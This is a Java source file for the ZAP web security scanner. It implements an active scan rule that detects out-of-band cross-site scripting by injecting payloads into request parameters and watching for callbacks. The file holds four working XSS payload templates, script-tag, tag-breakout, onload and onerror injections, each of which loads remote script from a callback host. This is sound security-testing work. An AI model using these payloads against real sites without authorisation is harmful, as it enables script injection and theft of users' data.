/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2021 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesBeta;

import java.io.IOException;
import java.text.MessageFormat;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.control.Control;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.addon.commonlib.PolicyTag;
import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerabilities;
import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerability;
import org.zaproxy.addon.oast.ExtensionOast;

public class OutOfBandXssScanRule extends AbstractAppParamPlugin
        implements CommonActiveScanRuleInfo {

    private static final Vulnerability VULN = Vulnerabilities.getDefault().get("wasc_8");
    private static final int PLUGIN_ID = 40031;
    private static final Logger LOGGER = LogManager.getLogger(OutOfBandXssScanRule.class);

    private static final Map<String, String> ALERT_TAGS;

    static {
        Map<String, String> alertTags =
                new HashMap<>(
                        CommonAlertTag.toMap(
                                CommonAlertTag.OWASP_2021_A03_INJECTION,
                                CommonAlertTag.OWASP_2017_A07_XSS,
                                CommonAlertTag.WSTG_V42_INPV_01_REFLECTED_XSS,
                                CommonAlertTag.WSTG_V42_INPV_02_STORED_XSS));
        alertTags.put(ExtensionOast.OAST_ALERT_TAG_KEY, ExtensionOast.OAST_ALERT_TAG_VALUE);
        alertTags.put(PolicyTag.DEV_FULL.getTag(), "");
        alertTags.put(PolicyTag.QA_FULL.getTag(), "");
        alertTags.put(PolicyTag.SEQUENCE.getTag(), "");
        ALERT_TAGS = Collections.unmodifiableMap(alertTags);
    }

    private static final String SIMPLE_SCRIPT_XSS_ATTACK = "<script src=\"{0}\"></script>";
    private static final String END_TAG_SCRIPT_XSS_ATTACK = "</script><script src=\"{0}\">";
    private static final String ON_LOAD_ATTRIBUTE_ATTACK =
            "\" onload=\"var s=document.createElement('script');s.src='{0}';document.getElementsByTagName('head')[0].appendChild(s);\" garbage=\"";
    private static final String ON_ERROR_ATTRIBUTE_ATTACK =
            "'\"><img src=x onerror=\"var s=document.createElement('script');s.src='{0}';document.getElementsByTagName('head')[0].appendChild(s);\">\n";

    private static final String[] XSS_ATTACK_PATTERNS = {
        SIMPLE_SCRIPT_XSS_ATTACK,
        END_TAG_SCRIPT_XSS_ATTACK,
        ON_LOAD_ATTRIBUTE_ATTACK,
        ON_ERROR_ATTRIBUTE_ATTACK
    };

    @Override
    public int getId() {
        return PLUGIN_ID;
    }

    @Override
    public String getName() {
        return Constant.messages.getString("ascanbeta.oobxss.name");
    }

    @Override
    public String getDescription() {
        return VULN.getDescription();
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return VULN.getSolution();
    }

    @Override
    public String getReference() {
        return VULN.getReferencesAsString();
    }

    @Override
    public int getCweId() {
        return 79;
    }

    @Override
    public int getWascId() {
        return 8;
    }

    @Override
    public Map<String, String> getAlertTags() {
        return ALERT_TAGS;
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public void init() {
        ExtensionOast extOast =
                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
        if (extOast == null
                || (extOast.getCallbackService() == null
                        && extOast.getActiveScanOastService() == null)) {
            getParent()
                    .pluginSkipped(this, Constant.messages.getString("ascanbeta.oobxss.skipped"));
        }
    }

    @Override
    public void scan(HttpMessage httpMessage, String param, String value) {
        try {
            ExtensionOast extOast =
                    Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
            if (extOast.getCallbackService() != null) {
                scanWithCallbackService(param);
            }
            if (extOast.getActiveScanOastService() != null) {
                scanWithExternalOastService(param);
            }
        } catch (Exception e) {
            LOGGER.warn("Could not perform Out of Band XSS Attack:", e);
        }
    }

    private void scanWithCallbackService(String param) {
        ExtensionOast extOast =
                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
        for (String attackStringPattern : XSS_ATTACK_PATTERNS) {
            try {
                HttpMessage msg = getNewMsg();
                Alert alert =
                        newAlert()
                                .setConfidence(Alert.CONFIDENCE_MEDIUM)
                                .setMessage(msg)
                                .setSource(Alert.Source.ACTIVE)
                                .build();
                String payload =
                        extOast.registerAlertAndGetPayloadForCallbackService(
                                alert, OutOfBandXssScanRule.class.getSimpleName());
                String attackString = MessageFormat.format(attackStringPattern, payload);
                alert.setAttack(attackString);
                setParameter(msg, param, attackString);
                sendAndReceive(msg);
            } catch (IOException e) {
                LOGGER.warn(e.getMessage(), e);
            }
        }
    }

    private void scanWithExternalOastService(String param) throws Exception {
        ExtensionOast extOast =
                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
        for (String attackStringPattern : XSS_ATTACK_PATTERNS) {
            try {
                HttpMessage msg = getNewMsg();
                Alert alert =
                        newAlert()
                                .setConfidence(Alert.CONFIDENCE_MEDIUM)
                                .setMessage(msg)
                                .setSource(Alert.Source.ACTIVE)
                                .build();
                String payload = "https://" + extOast.registerAlertAndGetPayload(alert);
                String attackString = MessageFormat.format(attackStringPattern, payload);
                alert.setAttack(attackString);
                setParameter(msg, param, attackString);
                sendAndReceive(msg);
            } catch (IOException e) {
                LOGGER.warn(e.getMessage(), e);
            }
        }
    }
}
